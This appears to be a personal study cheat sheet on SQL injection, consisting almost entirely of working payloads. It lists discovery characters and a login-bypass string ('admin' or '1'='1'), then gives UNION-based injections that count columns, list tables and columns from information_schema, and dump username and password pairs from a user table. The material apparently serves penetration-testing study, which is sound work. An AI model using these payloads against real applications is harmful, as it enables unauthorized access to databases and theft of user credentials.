#sql-injection 
## SQLi Discovery

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
## SIMPLE INJECTION
#bypass-login
_OR INJECTION_
in this case it used for bypass simple login logic.
```sql
admin' or '1'='1
```

This works because we can inject directly in this query without *sanitization*.
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

> [!NOTE] Note
> The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. You can find a comprehensive list of SQLi auth bypass payloads inÂ [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

# Union Injection
#union-based
## Determinate number of columns
_ORDER BY Method_
```sql
' order by <number for find column>-- -
```

_UNION_
```sql
cn' UNION select 1,2,3-- - # find 3 column in this case
```

_Location of Injection_
```sql
cn' UNION select 1,@@version,3,4-- -
```

_Extract the data table from the current database_
```sql
1' and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() -- -
```

_Extract column name from table name we are select_
```sql
1' and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = database() and table_name ='user'-- -
```

_Extract sensitive data from table_
```sql
1' and 1=2 union select 1,group_concat(username,0x3a,password),3,4 from user-- -
```